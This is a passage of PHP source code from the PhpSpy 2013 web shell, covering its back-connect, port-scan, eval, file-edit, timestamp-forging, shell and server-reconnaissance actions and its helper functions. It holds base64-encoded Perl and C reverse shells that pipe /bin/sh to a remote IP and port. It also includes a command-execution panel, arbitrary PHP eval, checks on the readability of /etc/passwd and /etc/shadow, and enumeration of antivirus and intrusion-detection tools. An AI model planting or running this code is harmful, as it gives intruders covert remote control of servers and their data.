						p('<td>'.$db_engine['Value'].'</td>');
						p('<td>'.$db_collation['Value'].'</td>');
					}
					p('<td>&nbsp;</td>');
					p('</tr>');
					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';$('dbform').submit();\" /></td></tr>");
					p("</table>");
				} else {
					p('<p class="red b">No tables</p>');
				}
				$DB->free_result($query);
			}
		}
		$DB->close();
	}
	formfoot();
}//end mysql

elseif ($act == 'backconnect') {

	!$p2 && $p2 = $_SERVER['REMOTE_ADDR'];
	!$p3 && $p3 = '12345';
	$usedb = array('perl'=>'perl','c'=>'c');

	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
		"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
		"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
		"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
		"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
		"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

	if ($p1 == 'start' && $p2 && $p3 && $p4){
		if ($p4 == 'perl') {
			cf('/tmp/angel_bc',$back_connect);
			$res = execute(which('perl')." /tmp/angel_bc ".$p2." ".$p3." &");
		} else {
			cf('/tmp/angel_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/angel_bc.c');
			$res = execute("/tmp/angel_bc ".$p2." ".$p3." &");
		}
		m('Now script try connect to '.$p2.':'.$p3.' ...');
	}

	formhead(array('title'=>'Back Connect', 'onsubmit'=>'g(\'backconnect\',null,\'start\',this.p2.value,this.p3.value,this.p4.value);return false;'));
	p('<p>');
	p('Your IP:');
	makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));
	p('Your Port:');
	makeinput(array('name'=>'p3','size'=>15,'value'=>$p3));
	p('Use:');
	makeselect(array('name'=>'p4','option'=>$usedb,'selected'=>$p4));
	makeinput(array('value'=>'Start','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();
}//end

elseif ($act == 'portscan') {
	!$p2 && $p2 = '127.0.0.1';
	!$p3 && $p3 = '21,80,135,139,445,1433,3306,3389,5631,43958';
	formhead(array('title'=>'Port Scan', 'onsubmit'=>'g(\'portscan\',null,\'start\',this.p2.value,this.p3.value);return false;'));
	p('<p>');
	p('IP:');
	makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));
	p('Port:');
	makeinput(array('name'=>'p3','size'=>80,'value'=>$p3));
	makeinput(array('value'=>'Scan','type'=>'submit','class'=>'bt'));
	p('</p>');
	formfoot();

	if ($p1 == 'start') {
		p('<h2>Result &raquo;</h2>');
		p('<ul class="info">');
		foreach(explode(',', $p3) as $port) {
			$fp = @fsockopen($p2, $port, $errno, $errstr, 1); 
			if (!$fp) {
				p('<li>'.$p2.':'.$port.' ------------------------ <span class="b">Close</span></li>');
		   } else {
				p('<li>'.$p2.':'.$port.' ------------------------ <span class="red b">Open</span></li>');
				@fclose($fp);
		   } 
		}
		p('</ul>');
	}
}

elseif ($act == 'eval') {
	$phpcode = trim($p1);
	if($phpcode){
		if (!preg_match('#<\?#si', $phpcode)) {
			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
		}
		eval("?".">$phpcode<?");
	}
	formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\'eval\',null,this.p1.value);return false;'));
	maketext(array('title'=>'PHP Code','name'=>'p1', 'value'=>$phpcode));
	p('<p><a href="http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/" target="_blank">Get plugins</a></p>');
	formfooter();
}//end eval

elseif ($act == 'editfile') {

	// 编辑文件
	if ($p1 == 'edit' && $p2 && $p3) {
		$fp = @fopen($p2,'w');
		m('Save file '.(@fwrite($fp,$p3) ? 'success' : 'failed'));
		@fclose($fp);
	}
	$contents = '';
	if(file_exists($p2)) {
		$fp=@fopen($p2,'r');
		$contents=@fread($fp, filesize($p2));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}
	formhead(array('title'=>'Create / Edit File', 'onsubmit'=>'g(\'editfile\',null,\'edit\',this.p2.value,this.p3.value);return false;'));
	makeinput(array('title'=>'Filename','name'=>'p2','value'=>$p2,'newline'=>1));
	maketext(array('title'=>'File Content','name'=>'p3','value'=>$contents));
	formfooter();
	goback();

}//end editfile

elseif ($act == 'newtime') {
	$filemtime = @filemtime($p1);

	formhead(array('title'=>'Clone folder/file was last modified time', 'onsubmit'=>'g(\'file\',null,\'clonetime\',this.p2.value,this.p3.value);return false;'));
	makeinput(array('title'=>'Alter folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Reference folder/file','name'=>'p3','value'=>$cwd,'size'=>120,'newline'=>1));
	formfooter();

	formhead(array('title'=>'Set last modified', 'onsubmit'=>'g(\'file\',null,\'settime\',this.p2.value,this.p3.value);return false;'));
	makeinput(array('title'=>'Current folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));
	makeinput(array('title'=>'Modify time','name'=>'p3','value'=>date("Y-m-d H:i:s", $filemtime),'size'=>120,'newline'=>1));
	formfooter();

	goback();
}//end newtime

elseif ($act == 'shell') {
	formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\'shell\',null,this.p1.value);return false;'));
	p('<p>');
	makeinput(array('name'=>'p1','value'=>htmlspecialchars($p1)));
	makeinput(array('class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();

	if ($p1) {
		p('<pre>'.execute($p1).'</pre>');
	}
}//end shell

elseif ($act == 'phpenv') {
	$d=array();
	if(function_exists('mysql_get_client_info'))
		$d[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$d[] = "MSSQL";
	if(function_exists('pg_connect'))
		$d[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$d[] = "Oracle";
	$info = array(
		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
		3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
		4 => array('Server OS',PHP_OS),
		5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
		7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
		8 => array('PHP run mode',strtoupper(php_sapi_name())),
		9 => array('The file path',__FILE__),

		10 => array('PHP Version',PHP_VERSION),
		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
		12 => array('Safe Mode',getcfg('safe_mode')),
		13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'))),
		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
		15 => array('enable_dl',getcfg('enable_dl')),
		16 => array('display_errors',getcfg('display_errors')),
		17 => array('register_globals',getcfg('register_globals')),
		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
		19 => array('memory_limit',getcfg('memory_limit')),
		20 => array('post_max_size',getcfg('post_max_size')),
		21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed')),
		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
		23 => array('disable_functions',($dis_func ? $dis_func : 'No')),
		24 => array('Supported databases',implode(', ', $d)),
		25 => array('cURL support',function_exists('curl_version') ? 'Yes' : 'No'),
		26 => array('Open base dir',getcfg('open_basedir')),
		27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir')),
		28 => array('Safe mode include dir',getcfg('safe_mode_include_dir')),
	);

	$hp = array(0=> 'Server', 1=> 'PHP');
	for($a=0;$a<2;$a++) {
		p('<h2>'.$hp[$a].' &raquo;</h2>');
		p('<ul class="info">');
		if ($a==0) {
			for($i=1;$i<=9;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		} elseif ($a == 1) {
			for($i=10;$i<=25;$i++) {
				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
			}
		}
		p('</ul>');
	}
}//end phpenv

elseif ($act == 'secinfo') {
	
	if( !IS_WIN ) {
		$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
		$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
		$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
		secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
		secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
		secparam('OS version', @file_get_contents('/proc/version'));
		secparam('Distr name', @file_get_contents('/etc/issue.net'));
		$safe_mode = @ini_get('safe_mode');
		if(!$GLOBALS['safe_mode']) {
			$temp=array();
			foreach ($userful as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Userful', implode(', ',$temp));
			$temp=array();
			foreach ($danger as $item)
				if(which($item)){$temp[]=$item;}
			secparam('Danger', implode(', ',$temp));
			$temp=array();
			foreach ($downloaders as $item) 
				if(which($item)){$temp[]=$item;}
			secparam('Downloaders', implode(', ',$temp));
			secparam('Hosts', @file_get_contents('/etc/hosts'));
			secparam('HDD space', execute('df -h'));
			secparam('Mount options', @file_get_contents('/etc/fstab'));
		}
	} else {
		secparam('OS Version',execute('ver'));
		secparam('Account Settings',execute('net accounts'));
		secparam('User Accounts',execute('net user'));
		secparam('IP Configurate',execute('ipconfig -all'));
	}
}//end

else {
	m('Undefined Action');
}

?>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;">
	<?php
	debuginfo();
	ob_end_flush();
	if (isset($DB)) {
		echo '. '.$DB->querycount.' queries';
	}
	?>
	</span>
	Powered by <a title="Build 20130112" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2013 final</a>. Copyright (C) 2004-2013 <a href="http://www.4ngel.net" target="_blank">[S4T]</a> All Rights Reserved.
</div>
</body>
</html>

<?php

/*======================================================
函数库
======================================================*/

function secparam($n, $v) {
	$v = trim($v);
	if($v) {
		p('<h2>'.$n.' &raquo;</h2>');
		p('<div class="infolist">');
		if(strpos($v, "\n") === false)
			p($v.'<br />');
		else
			p('<pre>'.$v.'</pre>');
		p('</div>');
	}
}
function m($msg) {
	echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
	echo $msg;
	echo '</div>';
}
function s_array($array) {
	return is_array($array) ? array_map('s_array', $array) : stripslashes($array);
}
function scookie($key, $value, $life = 0, $prefix = 1) {
	global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
	$key = ($prefix ? $cookiepre : '').$key;
	$life = $life ? $life : $cookielife;
	$useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
	setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
}
function loginpage() {
	formhead();
	makehide('act','login');
	makeinput(array('name'=>'password','type'=>'password','size'=>'20'));
	makeinput(array('type'=>'submit','value'=>'Login'));
	formfoot();
	exit;
}
function execute($cfe) {
	$res = '';
	if ($cfe) {
		if(function_exists('system')) {
			@ob_start();
			@system($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('passthru')) {
			@ob_start();
			@passthru($cfe);
			$res = @ob_get_contents();
			@ob_end_clean();
		} elseif(function_exists('shell_exec')) {
			$res = @shell_exec($cfe);
		} elseif(function_exists('exec')) {
			@exec($cfe,$res);
			$res = join("\n",$res);
		} elseif(@is_resource($f = @popen($cfe,"r"))) {
			$res = '';
			while(!@feof($f)) {
				$res .= @fread($f,1024); 
			}
			@pclose($f);
		}
	}
	return $res;
}
function which($pr) {
	$path = execute("which $pr");
	return ($path ? $path : $pr); 
}
function cf($fname,$text){
	if($fp=@fopen($fname,'w')) {
		@fputs($fp,@base64_decode($text));
		@fclose($fp);
	}
}
function dirsize($cwd) { 
	$dh = @opendir($cwd);
	$size = 0;
	while($file = @readdir($dh)) {
		if ($file != '.' && $file != '..') {
			$path = $cwd.'/'.$file;
			$size += @is_dir($path) ? dirsize($path) : sprintf("%u", @filesize($path));
		}
	}
	@closedir($dh);
	return $size;
}
// 页面调试信息
function debuginfo() {
	global $starttime;
	$mtime = explode(' ', microtime());
	$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
	echo 'Processed in '.$totaltime.' second(s)';
}

// 清除HTML代码
function html_clean($content) {
	$content = htmlspecialchars($content);
	$content = str_replace("\n", "<br />", $content);
	$content = str_replace("  ", "&nbsp;&nbsp;", $content);
	$content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
	return $content;
}

// 获取权限
function getChmod($file){
	return substr(base_convert(@fileperms($file),10,8),-4);
}

function PermsColor($f) { 
	if (!is_readable($f)) {
		return '<span class="red">'.getPerms($f).'</span>';
	} elseif (!is_writable($f)) {
		return '<span class="black">'.getPerms($f).'</span>';
	} else {
		return '<span class="green">'.getPerms($f).'</span>';
	}
}
function getPerms($file) {
	$mode = @fileperms($file);
	if (($mode & 0xC000) === 0xC000) {$type = 's';}
	elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
	elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
	elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
	elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
	elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
	elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
	else {$type = '?';}

	$owner['read'] = ($mode & 00400) ? 'r' : '-'; 
	$owner['write'] = ($mode & 00200) ? 'w' : '-'; 
	$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
	$group['read'] = ($mode & 00040) ? 'r' : '-'; 
	$group['write'] = ($mode & 00020) ? 'w' : '-'; 
	$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
	$world['read'] = ($mode & 00004) ? 'r' : '-'; 
	$world['write'] = ($mode & 00002) ? 'w' : '-'; 
	$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

	if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
	if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
 
	return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
}

function getUser($file)	{
	if (function_exists('posix_getpwuid')) {
		$array = @posix_getpwuid(@fileowner($file));
		if ($array && is_array($array)) {
			return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
		}
	}
	return '';
}

function copy_paste($c,$f,$d){
	if(is_dir($c.$f)){
		mkdir($d.$f);
		$dirs = scandir($c.$f);
		if ($dirs) {
			$dirs = array_diff($dirs, array('..', '.'));
			foreach ($dirs as $file) {
				copy_paste($c.$f.'/',$file, $d.$f.'/');
			}
		}
	} elseif(is_file($c.$f)) {
		copy($c.$f, $d.$f);
	}
}
// 删除目录
function deltree($deldir) {
	$dirs = @scandir($deldir);
	if ($dirs) {
		$dirs = array_diff($dirs, array('..', '.'));
		foreach ($dirs as $file) {	
			if((is_dir($deldir.'/'.$file))) {
				@chmod($deldir.'/'.$file,0777);
				deltree($deldir.'/'.$file); 
			} else {
				@chmod($deldir.'/'.$file,0777);
				@unlink($deldir.'/'.$file);
			}
		}
		@chmod($deldir,0777);
		return @rmdir($deldir) ? 1 : 0;
	} else {
		return 0;
	}
}

// 表格行间的背景色替换
function bg() {
	global $bgc;
	return ($bgc++%2==0) ? 'alt1' : 'alt2';
}

function cmp($a, $b) {
	global $sort;
	if(is_numeric($a[$sort[0]])) {
		return (($a[$sort[0]] < $b[$sort[0]]) ? -1 : 1)*($sort[1]?1:-1);
	} else {
		return strcmp($a[$sort[0]], $b[$sort[0]])*($sort[1]?1:-1);
	}
}

// 获取当前目录的上级目录
function getUpPath($cwd) {
	$pathdb = explode('/', $cwd);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}

// 检查PHP配置参数
function getcfg($varname) {
	$result = get_cfg_var($varname);
	if ($result == 0) {
		return 'No';
	} elseif ($result == 1) {
		return 'Yes';
	} else {
		return $result;
	}
}

// 获得文件扩展名
function getext($file) {
	$info = pathinfo($file);
	return $info['extension'];
}
function GetWDirList($path){
	global $dirdata,$j,$web_cwd;
	!$j && $j=1;
	$dirs = @scandir($path);
	if ($dirs) {
		$dirs = array_diff($dirs, array('..','.'));
		foreach ($dirs as $file) {
			$f=str_replace('//','/',$path.'/'.$file);
			if(is_dir($f)){
				if (is_writable($f)) {
					$dirdata[$j]['filename']='/'.str_replace($web_cwd,'',$f);
					$dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
					$dirdata[$j]['chmod']=getChmod($f);
					$dirdata[$j]['perm']=PermsColor($f);
					$dirdata[$j]['owner']=getUser($f);
					$dirdata[$j]['link']=$f;
					$j++;
				}
				GetWDirList($f);
			}
		}
		return $dirdata;
	} else {
		return array();
	}
}
function sizecount($size) {
	$unit = array('Bytes', 'KB', 'MB', 'GB', 'TB','PB');
	for ($i = 0; $size >= 1024 && $i < 5; $i++) {
		$size /= 1024;
	}
	return round($size, 2).' '.$unit[$i];
}
function p($str){
	echo $str."\n";
}

function makehide($name,$value=''){
	p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}

function makeinput($arg = array()){
	$arg['size'] = isset($arg['size']) && $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
	$arg['type'] = isset($arg['type']) ? $arg['type'] : 'text';
	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
	$arg['class'] = isset($arg['class']) ? $arg['class'] : 'input';
	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
	$arg['value'] = isset($arg['value']) ? $arg['value'] : '';
	if (isset($arg['newline'])) p('<p>');
	p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] />");
	if (isset($arg['newline'])) p('</p>');
}

function makeselect($arg = array()){
	$onchange = isset($arg['onchange']) ? 'onchange="'.$arg['onchange'].'"' : '';
	$arg['title'] = isset($arg['title']) ? $arg['title'] : '';
	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
	p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
		if (is_array($arg['option'])) {
			foreach ($arg['option'] as $key=>$value) {
				if ($arg['selected']==$key) {
					p("<option value=\"$key\" selected>$value</option>");
				} else {
					p("<option value=\"$key\">$value</option>");
				}
			}
		}
	p("</select>");
}
function formhead($arg = array()) {
	!isset($arg['method']) && $arg['method'] = 'post';
	!isset($arg['name']) && $arg['name'] = 'form1';
	$arg['extra'] = isset($arg['extra']) ? $arg['extra'] : '';
	$arg['onsubmit'] = isset($arg['onsubmit']) ? "onsubmit=\"$arg[onsubmit]\"" : '';
	p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"".SELF."\" method=\"$arg[method]\" $arg[onsubmit] $arg[extra]>");
	if (isset($arg['title'])) {
		p('<h2>'.$arg['title'].' &raquo;</h2>');
	}
}
	
function maketext($arg = array()){
	$arg['title'] = isset($arg['title']) ? $arg['title'].'<br />' : '';
	$arg['name'] = isset($arg['name']) ? $arg['name'] : '';
	p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"100\" rows=\"25\">$arg[value]</textarea></p>");
}

function formfooter($name = ''){
	!$name && $name = 'submit';
	p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
	p('</form>');
}

function goback(){
	global $cwd, $charset;
	p('<form action="'.SELF.'" method="post"><input type="hidden" name="act" value="file" /><input type="hidden" name="cwd" value="'.$cwd.'" /><input type="hidden" name="charset" value="'.$charset.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
}

function formfoot(){
	p('</form>');
}

function encode_pass($pass) {
	$k = 'angel';
	$pass = md5($k.$pass);
	$pass = md5($pass.$k);
	$pass = md5($k.$pass.$k);
	return $pass;
}

function pr($a) {
	p('<div style="text-align: left;border:1px solid #ddd;"><pre>'.print_r($a).'</pre></div>');
}

class DB_MySQL  {

	var $querycount = 0;
	var $link;
	var $charsetdb = array();
	var $charset = '';

	function connect($dbhost, $dbuser, $dbpass, $dbname='') {
		@ini_set('mysql.connect_timeout', 5);
		if(!$this->link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {
			$this->halt('Can not connect to MySQL server');
		}
		if($this->version() > '4.1') {
			$this->setcharset($this->charset);
		}
		$dbname && mysql_select_db($dbname, $this->link);
	}
	function setcharset($charset) {
		if ($charset && $this->charsetdb[$charset]) {
			if(function_exists('mysql_set_charset')) {
				mysql_set_charset($this->charsetdb[$charset], $this->link);
			} else {
				$this->query("SET character_set_connection='".$this->charsetdb[$charset]."', character_set_results='".$this->charsetdb[$charset]."', character_set_client=binary");
			}
		}
	}
	function select_db($dbname) {
		return mysql_select_db($dbname, $this->link);
	}
	function geterrdesc() {
		return (($this->link) ? mysql_error($this->link) : mysql_error());
	}
	function geterrno() {
		return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());
	}
	function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM
		return mysql_fetch_array($query, $result_type);
	}
	function query($sql) {
		//echo '<p style="color:#f00;">'.$sql.'</p>';
		if(!($query = mysql_query($sql, $this->link))) {
			$this->halt('MySQL Query Error', $sql);
		}
		$this->querycount++;
		return $query;
	}
	function query_res($sql) { 
		$res = '';
		if(!$res = mysql_query($sql, $this->link)) { 
			$res = 0;
		} else if(is_resource($res)) {
			$res = 1; 
		} else {
			$res = 2;
		}
		$this->querycount++;
		return $res;
	}
	function num_rows($query) {
		$query = mysql_num_rows($query);
		return $query;
	}
	function num_fields($query) {
		$query = mysql_num_fields($query);
		return $query;
	}
	function affected_rows() {
		return mysql_affected_rows($this->link);
	}
	function result($query, $row) {
		$query = mysql_result($query, $row);
		return $query;
	}	
	function free_result($query) {
		$query = mysql_free_result($query);
		return $query;
	}
	function version() {
		return mysql_get_server_info($this->link);
	}
	function close() {
		return mysql_close($this->link);
	}
	function halt($msg =''){
		echo "<h2>".htmlspecialchars($msg)."</h2>\n";
		echo "<p class=\"b\">Mysql error description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
		echo "<p class=\"b\">Mysql error number: ".$this->geterrno()."</p>\n";
		exit;
	}
	function get_fields_meta($result) {
		$fields = array();
		$num_fields = $this->num_fields($result);
		for ($i = 0; $i < $num_fields; $i++) {
			$field = mysql_fetch_field($result, $i);
			$fields[] = $field;
		}
		return $fields;
	}
	function sqlAddSlashes($s = ''){
		$s = str_replace('\\', '\\\\', $s);
		$s = str_replace('\'', '\'\'', $s);
		return $s;
	}
	// 备份数据库
	function sqldump($table, $fp=0) {
		$crlf = (IS_WIN ? "\r\n" : "\n");
		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
		$replace = array('\0', '\n', '\r', '\Z');

		if (isset($this->charset) && isset($this->charsetdb[$this->charset])) {
			$set_names = $this->charsetdb[$this->charset];
		} else {
			$set_names = $this->charsetdb['utf-8'];
		}
		$tabledump = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'.$crlf.$crlf;
		$tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf
			   . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf
			   . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf
			   . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;

		$tabledump .= "DROP TABLE IF EXISTS `$table`;".$crlf;
		$res = $this->query("SHOW CREATE TABLE $table");
		$create = $this->fetch($res, MYSQL_NUM);
		$tabledump .= $create[1].';'.$crlf.$crlf;
		if (strpos($tabledump, "(\r\n ")) {
			$tabledump = str_replace("\r\n", $crlf, $tabledump);
		} elseif (strpos($tabledump, "(\n ")) {
			$tabledump = str_replace("\n", $crlf, $tabledump);
		} elseif (strpos($tabledump, "(\r ")) {
			$tabledump = str_replace("\r", $crlf, $tabledump);
		}
		unset($create);

		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}
		$tabledump = '';
		$rows = $this->query("SELECT * FROM $table");
		$fields_cnt = $this->num_fields($rows);
		$fields_meta = $this->get_fields_meta($rows);

		while ($row = $this->fetch($rows, MYSQL_NUM)) {
			for ($j = 0; $j < $fields_cnt; $j++) {
				if (!isset($row[$j]) || is_null($row[$j])) {
					$values[] = 'NULL';
				} elseif ($fields_meta[$j]->numeric && $fields_meta[$j]->type != 'timestamp' && !$fields_meta[$j]->blob) {
					$values[] = $row[$j];
				} elseif ($fields_meta[$j]->blob) {
					if (empty($row[$j]) && $row[$j] != '0') {
						$values[] = '\'\'';
					} else {
						$values[] = '0x'.bin2hex($row[$j]);
					}
				} else {
					$values[] = '\''.str_replace($search, $replace, $this->sqlAddSlashes($row[$j])).'\'';
				}
			}
			$tabledump = 'INSERT INTO `'.$table.'` VALUES('.implode(', ', $values).');'.$crlf;
			unset($values);
			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		$this->free_result($rows);
	}
}
?>